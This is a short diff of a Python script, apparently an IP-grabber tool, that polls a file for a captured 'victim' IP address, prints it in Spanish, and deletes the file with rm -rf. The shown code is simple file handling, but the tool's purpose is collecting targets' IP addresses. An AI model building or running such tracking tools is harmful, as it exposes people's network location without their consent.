@@ -17,16 +17,19 @@ def cat():
  # os.system("cat ip.txt")
   print('\n\033[94m[!] IP de la victima encontrado')
   print(f'\n[~] IP: ', os.system("cat ip.txt"))
-  os.system("rm -rf ip.txt")
+ # os.system("rm -rf ip.txt")
 
 def check():
-    os.system("touch ip.txt")
+    #os.system("touch ip.txt")
     while True:
-        with open('ip.txt') as ip:
+        if os.path.isfile('ip.txt'):
+          print('[~] IP de la victima encontrado!')
+          with open('ip.txt') as ip:
             lines = ip.read().rstrip()
             if len(lines) != 0:
                 cat()
-        ip.close()   
+                os.system("rm -rf ip.txt")
+          ip.close()
 
 def server():
     os.system("clear")
